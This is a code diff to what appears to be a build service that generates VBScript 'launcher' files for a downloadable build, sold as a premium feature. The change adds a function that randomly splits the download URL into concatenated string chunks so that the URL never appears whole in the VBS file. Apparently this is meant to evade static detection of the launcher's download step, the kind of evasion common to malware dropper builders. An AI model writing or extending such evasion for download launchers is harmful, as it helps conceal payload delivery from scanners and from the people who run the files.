@@ -46,6 +46,33 @@ function timingSafeCompare(
 }
 
 /**
+ * Split a URL into a VBScript string-concatenation expression so the raw
+ * download URL never appears as a single contiguous string in the VBS file.
+ * Produces 3 to 5 chunks joined with " & ".
+ */
+function obfuscateVbsUrl(url: string): string {
+  const numParts = 3 + Math.floor(Math.random() * 3); // 3 to 5 parts
+  const len = url.length;
+  const cuts: number[] = [];
+
+  while (cuts.length < numParts - 1) {
+    const cut = 1 + Math.floor(Math.random() * (len - 2));
+    if (!cuts.includes(cut)) cuts.push(cut);
+  }
+  cuts.sort((a, b) => a - b);
+
+  const parts: string[] = [];
+  let prev = 0;
+  for (const c of cuts) {
+    parts.push(url.slice(prev, c));
+    prev = c;
+  }
+  parts.push(url.slice(prev));
+
+  return parts.map(p => `"${p}"`).join(' & ');
+}
+
+/**
  * POST /build - Receive build request, validate inputs, run build, return download URL.
  */
 async function postBuild(request: FastifyRequest, reply: FastifyReply) {
@@ -201,7 +228,7 @@ async function postBuild(request: FastifyRequest, reply: FastifyReply) {
     // Generate VBS launcher (premium feature)
     const vbsTemplate = fs.readFileSync(VBS_TEMPLATE_PATH, "utf8");
     const vbsContent = vbsTemplate
-      .replace(/\{\{DOWNLOAD_URL\}\}/g, downloadUrl)
+      .replace(/\{\{DOWNLOAD_URL_EXPR\}\}/g, obfuscateVbsUrl(downloadUrl))
       .replace(/\{\{MANUFACTURER\}\}/g, manufacturer);
     fs.writeFileSync(storage.vbsOutputPath(jobId), vbsContent, "utf8");
 
